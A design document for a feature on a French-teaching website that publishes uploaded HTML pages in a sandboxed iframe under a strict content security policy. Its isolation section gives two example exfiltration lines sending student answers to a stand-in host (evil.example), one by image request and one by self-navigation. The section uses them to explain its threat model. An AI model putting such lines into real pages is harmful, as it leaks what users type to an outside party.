# Uploaded HTML pages — design

Date: 2026-07-30

## Problem

Jenn writes teaching material as HTML pages — worksheets, drills, reference
sheets — and then shares them with students as PDFs. Flattening a page to a PDF
throws away everything that made it a page: nothing is clickable, nothing
animates, nothing checks an answer. She is doing this because a PDF is the only
artefact she has a way to hand out.

## Goal

Jenn publishes an HTML file to francaisavecjenn.ca and gets a link. Students
open the link and get the page as a page, interactive and unflattened. The file
she publishes is the file she wrote — we do not rewrite, sanitise, or restyle
it.

A second, weaker goal shapes the input path: Jenn's HTML is written with Claude
inside the Dia browser, which is sandboxed. If that environment can make an
HTTP request, publishing should be possible without leaving it.

## Scope

New:

- `prisma/schema.prisma` — `Page` and `PageGroup` models, plus a migration
- `lib/page-slug.ts` — `slugify`, `uniqueSlug`
- `lib/page-html.ts` — `MAX_PAGE_BYTES`, `validatePageHtml`
- `lib/page-payload.ts` — `parsePagePayload` for the API body
- `lib/pages.ts` — Prisma reads for the page routes
- `app/page-actions.ts` — `createPage`, `updatePage`, `deletePage`
- `app/p/[slug]/page.tsx` — the iframe shell
- `app/p/[slug]/raw/route.ts` — the stored HTML, with its CSP
- `app/g/[slug]/pages/page.tsx` — the student list
- `app/admin/pages/[slug]/page.tsx` — the editor for one page
- `app/api/pages/route.ts` — the token endpoint
- `components/admin/PageList.tsx`, `components/admin/PageEditor.tsx`
- `tests/lib/page-slug.test.ts`, `tests/lib/page-html.test.ts`,
  `tests/lib/page-payload.test.ts`

Changed:

- `app/admin/page.tsx` — a Pages section below Groups
- `CLAUDE.md` — the routes table, and the claim that `/api/auth/*` holds the
  only route handlers
- `docs/DEPLOYMENT.md` — the new `PAGES_UPLOAD_TOKEN` env var

Unchanged:

- Cards, card resolution, sections, dates, Claude generation, auth. A page has
  no date and no relationship to a card; the two features do not touch.

## Data model

```prisma
model Page {
  id        String      @id @default(cuid())
  slug      String      @unique
  title     String
  html      String
  createdAt DateTime    @default(now())
  updatedAt DateTime    @updatedAt
  groups    PageGroup[]
}

model PageGroup {
  pageId  String
  groupId String
  page    Page  @relation(fields: [pageId], references: [id], onDelete: Cascade)
  group   Group @relation(fields: [groupId], references: [id], onDelete: Cascade)

  @@id([pageId, groupId])
}
```

The HTML is a column, not a file on disk. The nightly `VACUUM INTO` backup then
covers pages with no new machinery, and restoring the database restores the
pages with it. A file-per-page directory would be a second thing to back up and
a second thing to get wrong.

`PageGroup` is an explicit join model rather than a Prisma implicit many-to-many
so the table has a name we choose and can query directly.

`Group` gains `pages PageGroup[]`. Deleting a group cascades to its `PageGroup`
rows, leaving pages that belong to it intact but unlisted — deleting a class
should not delete the material.

## Routes

| Route | Who | Notes |
|---|---|---|
| `/p/[slug]` | public | Full-viewport sandboxed iframe around the raw route |
| `/p/[slug]/raw` | public | The stored HTML, `text/html`, strict CSP |
| `/g/[slug]/pages` | students | That group's pages, newest first |
| `/admin/pages/[slug]` | teacher | Edit title, groups, HTML; delete |
| `POST /api/pages` | token | Create or replace a page from outside a browser |

Pages live at `/p/[slug]` rather than under a group, because a page can belong
to several groups and nesting would force one of them to be the canonical one.

`/g/[slug]/pages` is reachable only by knowing the URL — nothing on the card
page links to it. The flashcard is the point of that page and a resources link
would compete with it. Jenn shares the list URL once, the same way she shares
the group link.

Two of these are route handlers, which CLAUDE.md currently says exist only
under `/api/auth/*`. Both are real exceptions rather than server actions in the
wrong shape: `/p/[slug]/raw` returns a document that is not a React page, and
`/api/pages` is called by something that is not our UI. The CLAUDE.md sentence
gets updated to say so.

## Isolation

`/p/[slug]` renders one element of consequence:

```tsx
<iframe src={`/p/${slug}/raw`} sandbox="allow-scripts" title={page.title} />
```

`allow-scripts` **without** `allow-same-origin` is the whole security model.
The iframe document gets an opaque origin: its JavaScript runs, so quizzes,
tabs, and animations work, but it cannot read our cookies, our localStorage, or
the teacher session. Adding `allow-same-origin` alongside `allow-scripts` would
let the page remove its own sandbox, so the two must never appear together.

The CSP on the raw response is defence in depth:

```
default-src 'none';
script-src 'unsafe-inline' 'unsafe-eval' blob:;
style-src 'unsafe-inline';
img-src data: blob:;
font-src data:;
media-src data: blob:;
connect-src 'none';
frame-ancestors 'self';
form-action 'none';
base-uri 'none'
```

No directive admits `https:`. That is the point, and an earlier draft of this
document got it wrong: it allowed `https:` on the passive directives and
claimed `connect-src 'none'` meant "nothing it collects can leave the
browser". It does not. `connect-src` governs fetch, XHR, WebSocket and beacon
only — a subresource load is a real GET request, so `img-src https:` alone
would let a hostile page exfiltrate whatever a student typed with
`<img src="https://evil.example/log?d=answer">`. Closing the passive
directives is what makes the guarantee true.

`frame-ancestors 'self'` keeps other sites from embedding the page.

**Residual, accepted:** a sandboxed frame may navigate *itself*, so
`location.href = "https://evil.example/?d=…"` still leaks. No CSP directive
prevents it — `navigate-to` was never shipped. The sandbox does block
navigating the top window and opening popups. The exposure is limited to data
the student enters into that page; cookies, storage and the teacher session
stay unreachable either way.

Known limitation, accepted: nothing loads from a CDN — not scripts, not fonts,
not images, not stylesheets. Self-contained files, which is what Jenn writes,
are unaffected. Relaxing any of those lines is a decision to be taken
deliberately, knowing it reopens the path above.

There is no HTML sanitiser. Sanitising is the wrong tool here: it would strip
exactly the scripts and handlers that make the page worth publishing, and the
sandbox already contains what a sanitiser would be defending against.

The shell page sets no other chrome — no header, no back link. It stands in for
a PDF, and a PDF opens to its own first page.

## Publishing

### Admin

`/admin` gains a Pages section below Groups: the existing pages (title, link,
groups, delete) and a form to create one. `/admin/pages/[slug]` is the same form
prefilled, plus delete.

The form has three fields: title, group checkboxes, and the HTML. The HTML field
is a textarea that a file picker fills in client-side via `FileReader` — upload
and paste are one control, and the source stays editable after upload. The
server action therefore takes a string and never handles a file.

The slug comes from the title (`slugify`), with a numeric suffix if taken
(`uniqueSlug`). Editing a page's title does not move its slug; a link Jenn has
already given students must not break.

### Endpoint

`POST /api/pages`, with `Authorization: Bearer <PAGES_UPLOAD_TOKEN>`.

```jsonc
// request
{ "title": "Passé composé drills", "html": "<!doctype html>…",
  "groups": ["tuesday-adults"], "slug": "passe-compose-drills" }
// response
{ "url": "https://francaisavecjenn.ca/p/passe-compose-drills" }
```

`groups` holds group slugs and is optional; a page with no groups is reachable
by link but appears in no list. `slug` is optional — supplying one that already
exists replaces that page's title, HTML, and groups, which is how a corrected
page gets republished to the same link.

`PAGES_UPLOAD_TOKEN` lives in `.env.local`. When it is unset the route returns
404, so the endpoint does not exist in development or on any deployment that
has not opted in. The token comparison is constant-time, and the request is
rejected on `Content-Length` over `MAX_PAGE_BYTES` before the body is parsed.

Errors are JSON with a status: 401 for a bad token, 400 for a payload that
fails `parsePagePayload`, 413 for oversize, 404 for an unknown group slug.

This is the path Dia is pointed at. Whether Dia's sandbox permits an outbound
POST is untested; if it does not, the endpoint is still the way to publish from
`curl`, an Apple Shortcut, or any later tool, and the admin form remains the
path that is known to work.

## Validation

`validatePageHtml` accepts a string that is non-empty after trimming, under
`MAX_PAGE_BYTES` (2 MB, measured as UTF-8 bytes rather than characters), and
contains a `<`. The last check catches the obvious mistake of pasting a URL or a
filename instead of a document; it is not an attempt to parse HTML.

2 MB is generous for a self-contained page — a typical one is under 200 KB — and
leaves room for a few inlined data-URI images without letting a video into the
database.

## Testing

Per the convention in CLAUDE.md, the pure modules get tests and the components
and Prisma access do not:

- `page-slug` — accents and punctuation in a title, empty result falls back to
  `page`, `uniqueSlug` appends and increments a suffix
- `page-html` — empty, whitespace-only, over the cap, a multi-byte string that
  is under the cap in characters but over it in bytes, valid
- `page-payload` — missing title, missing html, wrong types, `groups` not an
  array of strings, valid with and without the optional fields

The sandbox attribute and the CSP are the security-critical parts and are not
unit-testable; they are checked by hand once against a page with a `fetch` in it
and a page that reads `document.cookie`.

## Out of scope

Versioning, per-page passwords, separate asset uploads, view counts, and any
edit of a page's content outside the admin textarea.
